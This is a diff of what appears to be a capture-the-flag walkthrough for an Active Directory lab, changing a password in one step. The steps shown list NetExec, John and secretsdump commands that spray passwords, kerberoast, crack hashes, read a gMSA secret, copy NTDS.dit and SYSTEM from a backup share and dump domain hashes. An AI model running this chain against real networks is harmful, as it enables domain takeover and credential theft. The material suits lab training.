@@ -17,7 +17,7 @@
 3. `nxc smb 192.168.109.20 -u users.txt -p users.txt --no-bruteforce --continue-on-success`
 4. `nxc ldap 192.168.109.20 -u svc_test -p svc_test --kerberoast kerb.hashes`
 5. `john kerb.hashes --wordlist=/usr/share/wordlists/rockyou.txt `
-6. `nxc ldap 192.168.109.10 -u svc_granite_sync -p granitecowboy9 -d old.velocity.hacklu --gmsa`
+6. `nxc ldap 192.168.109.10 -u svc_granite_sync -p Granite00 -d old.velocity.hacklu --gmsa`
 7. `nxc smb 192.168.109.10 -u svc_backup_gmsa$ --aesKey aa1af8ec9dc16864044bff3a34daec3fdf347e4a90becb2a75eb3310ee4fd862 --share Backup$ --get-file EXPORT/SYSTEM SYSTEM`
 8. `nxc smb 192.168.109.10 -u svc_backup_gmsa$ --aesKey aa1af8ec9dc16864044bff3a34daec3fdf347e4a90becb2a75eb3310ee4fd862 --share Backup$ --get-file EXPORT/NTDS.dit NTDS.dit`
 9. `secretsdump.py LOCAL -system SYSTEM -ntds NTDS.dit`
